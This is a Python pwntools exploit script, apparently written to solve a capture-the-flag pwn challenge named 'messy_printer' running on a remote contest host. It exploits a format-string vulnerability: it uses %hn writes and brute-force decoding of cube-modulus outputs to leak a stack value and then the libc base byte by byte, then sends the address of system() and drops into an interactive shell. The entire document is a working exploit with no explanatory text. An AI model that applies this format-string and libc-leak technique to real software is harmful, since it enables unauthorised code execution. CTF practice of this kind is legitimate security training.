#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

def brute_d(N, X):
    for i in range(0, 0x10000):
        si = int.from_bytes(bytes(str(i), 'ascii'), 'big')
        if pow(N - si, 3, N) == X:
            return i
    else:
        assert(False)

def brute_s(N, X):
    for i in range(0, 0x100):
        if pow(N - i, 3, N) == X:
            return i
    else:
        assert(False)

def fmt(s):
    r.sendafter('[y/n]: \n', 'y')
    r.sendlineafter('title: \n', '\x01')
    N = int.from_bytes(r.recvuntil('\nGive')[:-5], 'big') + 1
    r.sendlineafter('content: \n', s)
    X = int.from_bytes(r.recvuntil('\nCont')[:-5], 'big')
    return N, X

#r = process('./messy_printer')
r = remote('eofqual.zoolab.org', 4001)
libc = ELF('./libc.so.6')

N, X = fmt('%14$hu')
leak = brute_d(N, X)
tail = leak - 240 + 5

libc_base = 0

for i in range(6):
    fmt(f'%{tail-i}c%14$hn')
    N, X = fmt('%51$s')
    libc_base <<= 8
    libc_base += brute_s(N, X)
    # zero it
    fmt(f'%51$hhn')

libc_base -= 0x270b3
libc.address = libc_base
log.info(f'Get libc base: {hex(libc_base)}')

system = libc.symbols['system']
r.sendafter('[y/n]: \n', 'n')
r.sendafter('magic: \n', p64(system))

r.interactive()
